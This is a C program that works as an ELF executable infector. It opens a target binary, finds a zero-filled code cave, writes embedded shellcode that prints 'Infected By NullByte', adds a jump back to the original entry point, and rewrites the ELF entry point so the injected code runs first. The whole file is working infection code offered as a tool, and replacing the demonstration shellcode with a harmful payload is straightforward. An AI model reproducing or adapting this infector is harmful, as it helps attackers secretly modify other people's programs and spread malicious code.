#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc,char *argv[]){
    FILE *file;
    unsigned int code_seg = 0;
    char sll[9];
    char start[9];
    unsigned long long shell_addr;
    char shellcode[] = {
            0xeb,0x00,0xe8,0x16,0x00,0x00,0x00,0x49,0x6e,0x66,0x65,0x63,0x74,0x65,0x64,0x20,0x42,0x79,0x20,0x4e,0x75,0x6c,0x6c,0x42,0x79,0x74,0x65,0x0d,0x0a,0xb8,0x04,0x00,0x00,0x00,0xbb,0x01,0x00,0x00,0x00,0x59,0xba,0x16,0x00,0x00,0x00,0xcd,0x80
    };
    char jump_main[] = {0x48,0xc7,0xc0,0x00,0x00,0x00,0x00,0xff,0xe0};
    unsigned int shellcode_size = 47;
    unsigned int ret_size = 9;
    unsigned int shellsize = ret_size+shellcode_size;
    unsigned int ind = 0;


    if(argc < 2){
        printf("Usage: %s [target file]\n",argv[0]);
        return 0;
    }

    file = fopen(argv[1], "r+b");
    char elf[5] = {fgetc(file), fgetc(file), fgetc(file), fgetc(file), 0x00};
    char s_elf[5] = {0x7f,0x45,0x4c,0x46,0x00};

    if(strcmp(elf,s_elf)){
        printf("The file is not an ELF binary\n");
        exit(0);
    }

    unsigned int ar = fgetc(file);
    if(ar == 1){
        code_seg = 134512640;
    }else if(ar == 2){
        code_seg = 4194304;
    }


//    if(fgetc(file) != 2){
//        printf("The file is not an executable ELF binary\n");
//        printf("here\n");
//        exit(0);
//    }

    fseek(file, 0, SEEK_END);
    unsigned long long sz = ftell(file);

    fseek(file, 24, SEEK_SET);


    sprintf(&start[ind],"%02x",(unsigned char)fgetc(file));
    ind += 2;
    sprintf(&start[ind],"%02x",(unsigned char)fgetc(file));
    ind += 2;
    sprintf(&start[ind],"%02x",(unsigned char)fgetc(file));
    ind += 2;
    sprintf(&start[ind],"%02x",(unsigned char)fgetc(file));

    for(int i=0;i<8;i++){
        if(start[i]-96 > 0){
            start[i] = 10+(start[i]-97);
        }else{
            start[i] -= 48;
        }
    }

    int fail = 0;
    unsigned int place = (start[1] + start[0]*16 + start[3]*256 + start[2]*4096 + start[5]*65536 + start[4]*1048576 + start[7]*16777216 + start[6]*268435456) - code_seg; //Calculates the address of '_start' function
    for(unsigned long long i=place;i<sz;i++){
        fseek(file, i, SEEK_SET);
        if(sz-i <= shellsize)
            break;
        fail = 0;
        for(unsigned int ms=0;ms<shellsize;ms++){
            if((unsigned)fgetc(file) != 0x00){
                fail = 1;
                break;
            }
        }
        if(!fail){
            shell_addr = i;
            break;
        }
    }

    jump_main[3] = start[1] + start[0]*16;
    jump_main[4] = start[3] + start[2]*16;
    jump_main[5] = start[5] + start[4]*16;
    jump_main[6] = start[7] + start[6]*16;

    fseek(file, shell_addr, SEEK_SET);

    for(unsigned int lk=0;lk<shellcode_size;lk++){
        fputc(shellcode[lk], file);
    }
    for(unsigned int lk=0;lk<ret_size;lk++){
        fputc(jump_main[lk], file);
    }

    sprintf(sll,"%08x",(unsigned long long)(code_seg+shell_addr));
    for(int i=0;i<8;i++){
        if(sll[i]-96 > 0){
            sll[i] = 10+(sll[i]-97);
        }else{
            sll[i] -= 48;
        }
    }

    fseek(file, 24, SEEK_SET);
    fputc(sll[7] + sll[6]*16, file);
    fputc(sll[5] + sll[4]*16, file);
    fputc(sll[3] + sll[2]*16, file);
    fputc(sll[1] + sll[0]*16, file);
    fclose(file);
    printf("Done\n");
    return 0;
}